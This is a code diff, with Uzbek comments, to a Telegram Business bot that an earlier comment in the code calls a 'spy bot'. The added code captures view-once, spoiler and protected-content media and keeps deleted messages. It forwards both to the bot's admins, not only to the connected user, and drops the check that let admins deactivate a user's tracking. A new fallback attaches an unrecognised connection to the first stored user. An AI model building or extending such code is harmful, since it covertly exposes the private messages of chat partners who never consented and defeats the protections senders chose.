@@ -429,6 +429,62 @@ async def handle_business_connection(conn: BusinessConnection, bot: Bot):
 # ==========================================
 # 2. Xabarlarni Kuzatish (Business Message)
 # ==========================================
+async def resolve_business_user(
+    bot: Bot,
+    conn_id: str,
+    sender_id: Optional[int] = None
+) -> Optional[dict]:
+    """
+    Business connection egasini bazadan yoki to'g'ridan-to'g'ri Telegram API dan aniqlash va yangilash.
+    Server qayta ishga tushganda yoki baza yangilanganda ham foydalanuvchini 100% tiklaydi.
+    """
+    # 1. Avval connection_id bo'yicha qidiramiz
+    user = await db.get_user_by_connection(conn_id)
+
+    # 2. Agar bazada connection_id bo'yicha topilmasa, Telegram API dan to'g'ridan-to'g'ri so'raymiz
+    if not user:
+        try:
+            conn_info = await bot.get_business_connection(conn_id)
+            if conn_info and conn_info.user:
+                bu = conn_info.user
+                logger.info(f"Telegram API orqali business connection tiklandi: user_id={bu.id}, name={bu.full_name}, username={bu.username}")
+                await db.register_or_update_user(
+                    user_id=bu.id,
+                    first_name=bu.first_name,
+                    last_name=bu.last_name,
+                    username=bu.username,
+                    business_connection_id=conn_id,
+                    tracking_type="normal",
+                    is_active=1
+                )
+                await db.set_user_connection(bu.id, conn_id, True)
+                user = await db.get_user(bu.id)
+        except Exception as e:
+            logger.warning(f"get_business_connection failed for {conn_id}: {e}")
+
+    # 3. Agar hali ham topilmasa va sender_id bo'lsa, sender_id bo'yicha tekshiramiz
+    if not user and sender_id:
+        user = await db.get_user(sender_id)
+
+    # 4. Agar foydalanuvchi topildi, lekin is_active == 0 bo'lsa:
+    # Telegram ushbu connection_id orqali xabar yuborayotgan ekan, connection FAOL!
+    if user and user.get("is_active") == 0:
+        uid = user.get("user_id")
+        if uid:
+            await db.set_user_connection(uid, conn_id, True)
+            user["is_active"] = 1
+            logger.info(f"Foydalanuvchi {uid} holati faol (is_active=1) ga yangilandi.")
+
+    # 5. Agar hali ham topilmasa, bazadagi mavjud foydalanuvchilarni ko'ramiz
+    if not user:
+        all_users = await db.get_all_users()
+        if all_users:
+            u = all_users[0]
+            await db.set_user_connection(u["user_id"], conn_id, True)
+            user = await db.get_user(u["user_id"])
+
+    return user
+
 @business_router.business_message()
 async def handle_business_message(message: Message, bot: Bot):
     conn_id = message.business_connection_id
@@ -442,18 +498,12 @@ async def handle_business_message(message: Message, bot: Bot):
     if await should_ignore_business_event(bot, message.chat.id, sender_id):
         return
 
-    # Foydalanuvchini bazadan connection_id bo'yicha aniqlaymiz
-    user = await db.get_user_by_connection(conn_id)
-    if not user and sender_id:
-        user = await db.get_user(sender_id)
+    # Foydalanuvchini bazadan yoki Telegram API dan 100% kafolatli aniqlaymiz
+    user = await resolve_business_user(bot, conn_id, sender_id)
 
     user_name = user.get("first_name", "Foydalanuvchi") if user else "Foydalanuvchi"
     is_special = user and user.get("tracking_type") == "special"
     tracked_user_id = user.get("user_id") if user else None
-
-    # Agar foydalanuvchi adminga bog'langan bo'lsa va admin paneldan nofaol qilingan bo'lsa, o'tkazib yuboramiz
-    if user and user.get("is_active") == 0:
-        return
 
     # Xabar kimdan va kimgacha ekanligini aniqlash
     sender_name = sender.full_name if sender else "Noma'lum"
@@ -522,6 +572,12 @@ async def handle_business_message(message: Message, bot: Bot):
     elif message.poll:
         msg_text = f"📊 So'rovnoma: {message.poll.question}"
 
+    logger.info(
+        f"Business xabar qabul qilindi: chat_id={message.chat.id}, msg_id={message.message_id}, "
+        f"type={media_type}, sender={sender_mention}, outgoing={is_outgoing}, "
+        f"has_spoiler={getattr(message, 'has_media_spoiler', False)}"
+    )
+
     # Media faylni darhol mahalliy diskka yuklab olamiz (o'chib ketuvchi xabarlar uchun juda muhim!)
     local_path = None
     if file_id and media_type in {"photo", "video", "animation", "video_note", "voice", "audio", "document"}:
@@ -545,52 +601,103 @@ async def handle_business_message(message: Message, bot: Bot):
     if tracked_user_id:
         await db.increment_user_messages(tracked_user_id)
 
-    # DIQQAT: Oddiy kiruvchi xabarlar paytida kuzatilayotgan foydalanuvchiga xabar qaytarilmaydi!
-    # Bu spy bot fosh bo'lishini va loop/spam paydo bo'lishini oldini oladi.
-    # Foydalanuvchiga faqat xabar o'chirilganda yoki tahrirlanganda yuboriladi.
+    # O'chib ketuvchi (View-Once / Spoiler / Yashirin) mediani aniqlash:
+    has_spoiler = bool(getattr(message, "has_media_spoiler", False))
+    has_protected = bool(getattr(message, "has_protected_content", False))
+    is_view_once = bool(has_spoiler or has_protected)
 
-    # Faqat MAXSUS KUZATUV (special) kodi orqali ulangan foydalanuvchilarning oddiy xabarlari adminga yuboriladi.
-    # Oddiy kuzatuvda admin panelga har bir oddiy yozishma yuborilmaydi.
-    # Shuningdek, agar admin o'zi sinov o'tkazayotgan bo'lsa (admin_id == tracked_user_id), o'z xabarlari unga qaytib bormaydi.
-    if not is_special:
+    # 1. AGAR O'CHIB KETUVCHI (VIEW-ONCE) YOKI YASHIRIN MEDIA BO'LSA:
+    # Bu media bir marta ko'rilgach yo'q bo'lib ketishi yoki yashirin bo'lgani sababli,
+    # bot uni darhol tutib olib, foydalanuvchining botiga xavfsiz saqlab beradi!
+    if is_view_once and tracked_user_id and media_type:
+        vo_dir = "📤 Siz yuborgan" if is_outgoing else "📥 Suhbatdoshingiz yuborgan"
+        vo_header = (
+            f"📸 <b>O'chib ketuvchi (View-Once / Yashirin) media saqlandi!</b>\n\n"
+            f"📍 <b>Holat:</b> {vo_dir}\n"
+            f"👤 <b>Kimdan:</b> {html.escape(sender_mention)}\n"
+            f"💬 <b>Chat:</b> {html.escape(chat_partner)}\n\n"
+            f"💡 <i>Ushbu {media_type.upper()} bir martalik (View-Once) yoki yashirin formatda yuborilgan. "
+            f"U chatda o'chib ketsa ham, shu yerda butunlay saqlanib qoladi!</i>"
+        )
+        if msg_text and msg_text != f"[{media_type.upper()}]":
+            vo_header += f"\n\n💬 <code>{html.escape(msg_text[:500])}</code>"
+
+        cached_row = await db.get_cached_message(conn_id, message.chat.id, message.message_id)
+        cached_id = cached_row.get("id") if cached_row else None
+        vo_markup = None
+        if cached_id:
+            vo_markup = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="📥 Asl faylni yuklab olish", callback_data=f"dl_msg_{cached_id}")]
+            ])
+
+        sent_vo = await send_saved_media(
+            bot=bot,
+            chat_id=tracked_user_id,
+            media_type=media_type,
+            file_id=file_id,
+            local_file_path=local_path,
+            caption=vo_header,
+            reply_markup=vo_markup
+        )
+        if sent_vo:
+            await db.save_sent_notification(
+                bot_message_id=sent_vo.message_id,
+                user_id=tracked_user_id,
+                cached_id=cached_id,
+                original_chat_id=message.chat.id,
+                original_message_id=message.message_id,
+                media_type=media_type,
+                file_id=file_id,
+                local_file_path=local_path,
+                text=msg_text,
+                caption=message.caption
+            )
+
+    # 2. Oddiy ovozli xabarlar (golos) va videolar (videolar) suhbat paytida foydalanuvchiga yuborilmaydi (faqat o'chirilganda yuboriladi!)
+    # Bu orqali suhbat paytida foydalanuvchini har bir golos/video bilan bezovta qilish to'xtatildi.
+
+    # 3. Adminga xabarlarni yetkazish:
+    # Faqat MAXSUS KUZATUV (special) rejimida yoki O'CHIB KETUVCHI xabar bo'lganda adminga boradi.
+    if not (is_special or is_view_once):
         return
 
-    # ADMINGA KUZATUV XABARINI YUBORISH
-    mode_tag = "🚨 <b>MAXSUS KUZATUV:</b>"
+    admin_tag = "📸 <b>O'CHIB KETUVCHI (VIEW-ONCE) MEDIA:</b>" if is_view_once else "🚨 <b>MAXSUS KUZATUV:</b>"
     user_header_info = f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}"
     chat_info = f"💬 <b>Chat:</b> {html.escape(chat_partner)}"
     action_info = f"📍 <b>Harakat:</b> {html.escape(action_text)}"
-    admin_header = f"{mode_tag}\n\n{user_header_info}\n{chat_info}\n{action_info}"
+    admin_header = f"{admin_tag}\n\n{user_header_info}\n{chat_info}\n{action_info}"
 
     admin_ids = await db.get_all_admin_ids()
     for admin_id in admin_ids:
-        if admin_id == tracked_user_id:
+        # Agar admin o'zi sinov o'tkazayotgan bo'lsa va yuqorida bildirishnoma olgan bo'lsa, takrorlamaymiz
+        if admin_id == tracked_user_id and is_view_once:
             continue
         try:
+            adm_photo = FSInputFile(local_path) if (local_path and os.path.exists(local_path)) else file_id
             if media_type == "photo":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_photo(chat_id=admin_id, photo=file_id, caption=caption, parse_mode="HTML")
+                await bot.send_photo(chat_id=admin_id, photo=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "video":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_video(chat_id=admin_id, video=file_id, caption=caption, parse_mode="HTML")
+                await bot.send_video(chat_id=admin_id, video=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "animation":
                 caption = safe_format_caption(admin_header, msg_text)
                 await bot.send_animation(chat_id=admin_id, animation=file_id, caption=caption, parse_mode="HTML")
             elif media_type == "video_note":
                 await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n⭕️ <b>Dumaloq video (Video Note):</b>", parse_mode="HTML")
-                await bot.send_video_note(chat_id=admin_id, video_note=file_id)
+                await bot.send_video_note(chat_id=admin_id, video_note=adm_photo)
             elif media_type == "voice":
                 caption = safe_format_caption(admin_header, "🎤 Ovozli xabar")
-                await bot.send_voice(chat_id=admin_id, voice=file_id, caption=caption, parse_mode="HTML")
+                await bot.send_voice(chat_id=admin_id, voice=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "document":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_document(chat_id=admin_id, document=file_id, caption=caption, parse_mode="HTML")
+                await bot.send_document(chat_id=admin_id, document=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "sticker":
                 await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n🎭 <b>Stiker:</b>", parse_mode="HTML")
                 await bot.send_sticker(chat_id=admin_id, sticker=file_id)
             elif media_type == "audio":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_audio(chat_id=admin_id, audio=file_id, caption=caption, parse_mode="HTML")
+                await bot.send_audio(chat_id=admin_id, audio=adm_photo, caption=caption, parse_mode="HTML")
             else:
                 full_text = safe_format_text(admin_header, msg_text or "[Xabar]")
                 await send_to_admin_safely(bot, admin_id, full_text)
@@ -619,10 +726,8 @@ async def handle_edited_business_message(message: Message, bot: Bot):
     sender_mention = f"@{sender_user.username}" if (sender_user and sender_user.username) else ((sender_user.full_name if sender_user else None) or "Noma'lum")
     chat_title = message.chat.full_name or message.chat.title or message.chat.username or "Shaxsiy chat"
 
-    # Foydalanuvchini bazadan olamiz
-    user = await db.get_user_by_connection(conn_id)
-    if not user and sender_id:
-        user = await db.get_user(sender_id)
+    # Foydalanuvchini bazadan yoki Telegram API dan olamiz
+    user = await resolve_business_user(bot, conn_id, sender_id)
 
     tracked_user_id = user.get("user_id") if user else None
     user_name = user.get("first_name", "Foydalanuvchi") if user else "Foydalanuvchi"
@@ -676,8 +781,13 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
     chat_title = event.chat.full_name or event.chat.title or event.chat.username or "Shaxsiy chat"
 
     # Foydalanuvchini connection_id orqali topamiz
-    user = await db.get_user_by_connection(conn_id)
+    user = await resolve_business_user(bot, conn_id)
     tracked_user_id = user.get("user_id") if user else None
+
+    logger.info(
+        f"O'chirilgan xabarlar eventi: conn_id={conn_id}, chat={event.chat.id}, "
+        f"ids={event.message_ids}, tracked_user_id={tracked_user_id}"
+    )
 
     admin_ids = await db.get_all_admin_ids()
     is_admin_chat = event.chat.id in admin_ids
@@ -687,7 +797,7 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
 
         # Agar conn_id bo'yicha user topilmagan bo'lsa, keshdagi connection_id dan tekshirib ko'ramiz
         if not user and cached and cached.get("business_connection_id"):
-            user = await db.get_user_by_connection(cached.get("business_connection_id"))
+            user = await resolve_business_user(bot, cached.get("business_connection_id"))
             if user:
                 tracked_user_id = user.get("user_id")
 
@@ -697,7 +807,7 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
         if cached:
             cached_sender = cached.get("sender_id")
             media_type = cached.get("media_type")
-            fallback_media = media_type or "media"
+            fallback_media = media_type or "xabar"
             cached_text = cached.get("text") or cached.get("caption") or f"[{fallback_media.upper()}]"
             sender_name = cached.get("sender_username")
             sender_str = f"@{sender_name}" if sender_name else (cached.get("sender_name") or "Noma'lum")
@@ -705,17 +815,33 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
             local_path = cached.get("local_file_path")
             is_from_user = (cached_sender == tracked_user_id) if tracked_user_id else False
 
-            # 1) FOYDALANUVCHIGA YUBORISH (Agar suhbatdoshi o'chirgan bo'lsa yoki view-once media bo'lsa)
-            if tracked_user_id and not is_from_user:
+            # Diskdagi kesh fayli borligini tekshiramiz
+            if not local_path or not os.path.exists(local_path):
+                for f in MEDIA_CACHE_DIR.glob(f"{event.chat.id}_{msg_id}.*"):
+                    if f.exists() and f.stat().st_size > 0:
+                        local_path = str(f)
+                        break
+
+            # 1) FOYDALANUVCHIGA YUBORISH (Kuzatilayotgan hisob egasiga)
+            if tracked_user_id:
                 media_info = f" ({fallback_media.upper()})" if media_type else ""
-                user_del_msg = (
-                    f"🗑 <b>Suhbatdoshingiz o'chirib yuborgan xabar saqlandi!</b>{media_info}\n\n"
-                    f"👤 <b>Kimdan:</b> {html.escape(sender_str)}\n"
-                    f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
-                    f"▫️ <b>O'chirilgan ma'lumot:</b>\n"
-                    f"<code>{html.escape(cached_text[:1500])}</code>\n\n"
-                    f"💡 <i>Ushbu xabarga reply qilib har qanday xabar yozsangiz, fayl darhol yuklab beriladi.</i>"
-                )
+                if is_from_user:
+                    user_del_msg = (
+                        f"🗑 <b>Siz o'chirib yuborgan xabaringiz saqlandi!</b>{media_info}\n\n"
+                        f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
+                        f"▫️ <b>O'chirilgan ma'lumot:</b>\n"
+                        f"<code>{html.escape(cached_text[:1500])}</code>\n\n"
+                        f"💡 <i>Ushbu xabarga reply qilib har qanday xabar yozsangiz, fayl darhol yuklab beriladi.</i>"
+                    )
+                else:
+                    user_del_msg = (
+                        f"🗑 <b>Suhbatdoshingiz o'chirib yuborgan xabar saqlandi!</b>{media_info}\n\n"
+                        f"👤 <b>Kimdan:</b> {html.escape(sender_str)}\n"
+                        f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
+                        f"▫️ <b>O'chirilgan ma'lumot:</b>\n"
+                        f"<code>{html.escape(cached_text[:1500])}</code>\n\n"
+                        f"💡 <i>Ushbu xabarga reply qilib har qanday xabar yozsangiz, fayl darhol yuklab beriladi.</i>"
+                    )
 
                 reply_markup = None
                 if media_type:
@@ -747,50 +873,49 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
                         caption=cached.get("caption")
                     )
 
-            # 2) ADMINGA YUBORISH (Faqat chat adminning o'zi bilan bo'lmasa yoki test qilinayotgan bo'lsa)
-            if not is_admin_chat or (cached_sender not in admin_ids):
-                mode_tag = "🚨 <b>MAXSUS KUZATUV (O'CHIRILDI):</b>" if is_special else "🗑 <b>XABAR O'CHIRILDI:</b>"
-                admin_header = (
-                    f"{mode_tag}\n\n"
-                    f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}\n"
-                    f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
-                    f"👤 <b>Kim o'chirdi:</b> {html.escape(sender_str)}"
+            # 2) ADMINGA YUBORISH
+            mode_tag = "🚨 <b>MAXSUS KUZATUV (O'CHIRILDI):</b>" if is_special else "🗑 <b>XABAR O'CHIRILDI:</b>"
+            admin_header = (
+                f"{mode_tag}\n\n"
+                f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}\n"
+                f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
+                f"👤 <b>Kim o'chirdi:</b> {html.escape(sender_str)}"
+            )
+            admin_cap = safe_format_caption(admin_header, f"[O'chirilgan {fallback_media}]\n{cached_text}")
+
+            admin_markup = None
+            if media_type:
+                admin_markup = InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(text="📥 Faylni yuklab olish", callback_data=f"dl_msg_{cached['id']}")]
+                ])
+
+            for admin_id in admin_ids:
+                # Agar admin o'zi bu chatdagi foydalanuvchi bo'lsa va yuqorida bildirishnoma olgan bo'lsa, takrorlamaymiz
+                if admin_id == tracked_user_id:
+                    continue
+
+                sent_adm = await send_saved_media(
+                    bot=bot,
+                    chat_id=admin_id,
+                    media_type=media_type,
+                    file_id=file_id,
+                    local_file_path=local_path,
+                    caption=admin_cap,
+                    reply_markup=admin_markup
                 )
-                admin_cap = safe_format_caption(admin_header, f"[O'chirilgan {fallback_media}]\n{cached_text}")
-
-                admin_markup = None
-                if media_type:
-                    admin_markup = InlineKeyboardMarkup(inline_keyboard=[
-                        [InlineKeyboardButton(text="📥 Faylni yuklab olish", callback_data=f"dl_msg_{cached['id']}")]
-                    ])
-
-                for admin_id in admin_ids:
-                    # Agar admin o'zi bu chatdagi foydalanuvchi bo'lsa va yuqorida bildirishnoma olgan bo'lsa, qayta yubormaymiz
-                    if admin_id == tracked_user_id and not is_from_user:
-                        continue
-
-                    sent_adm = await send_saved_media(
-                        bot=bot,
-                        chat_id=admin_id,
+                if sent_adm:
+                    await db.save_sent_notification(
+                        bot_message_id=sent_adm.message_id,
+                        user_id=admin_id,
+                        cached_id=cached.get("id"),
+                        original_chat_id=event.chat.id,
+                        original_message_id=msg_id,
                         media_type=media_type,
                         file_id=file_id,
                         local_file_path=local_path,
-                        caption=admin_cap,
-                        reply_markup=admin_markup
+                        text=cached_text,
+                        caption=cached.get("caption")
                     )
-                    if sent_adm:
-                        await db.save_sent_notification(
-                            bot_message_id=sent_adm.message_id,
-                            user_id=admin_id,
-                            cached_id=cached.get("id"),
-                            original_chat_id=event.chat.id,
-                            original_message_id=msg_id,
-                            media_type=media_type,
-                            file_id=file_id,
-                            local_file_path=local_path,
-                            text=cached_text,
-                            caption=cached.get("caption")
-                        )
 
             # 3) Xabarni keshdan birdaniga o'chirib yubormaymiz, balki o'chirilgan deb belgilaymiz!
             # Shunda foydalanuvchi replay qilganda ("replay qilib har qanday xabar yozsa"), fayl keshda turadi va uni yuklab bera oladi.
@@ -798,6 +923,22 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
 
         else:
             # Keshda saqlanmagan xabar o'chirilganda
+            logger.info(f"Keshda saqlanmagan xabar o'chirildi: chat={event.chat.id}, msg_id={msg_id}")
+            if tracked_user_id:
+                try:
+                    await bot.send_message(
+                        chat_id=tracked_user_id,
+                        text=(
+                            f"🗑 <b>Suhbatda xabar o'chirildi!</b>\n\n"
+                            f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
+                            f"🆔 <b>Message ID:</b> <code>{msg_id}</code>\n\n"
+                            f"▫️ <i>(Ushbu xabar bot ulanishidan oldin yozilgani yoki muddati o'tgani sababli uning matni saqlanmagan)</i>"
+                        ),
+                        parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.warning(f"Could not notify user of uncached deleted msg: {e}")
+
             if not is_admin_chat:
                 mode_tag = "🚨 <b>MAXSUS KUZATUV (O'CHIRILDI):</b>" if is_special else "🗑 <b>XABAR O'CHIRILDI:</b>"
                 admin_text = (
@@ -808,3 +949,4 @@ async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: 
                     f"▫️ <i>(Keshda saqlanmagan eski xabar)</i>"
                 )
                 await broadcast_to_admins(bot, admin_text)
+
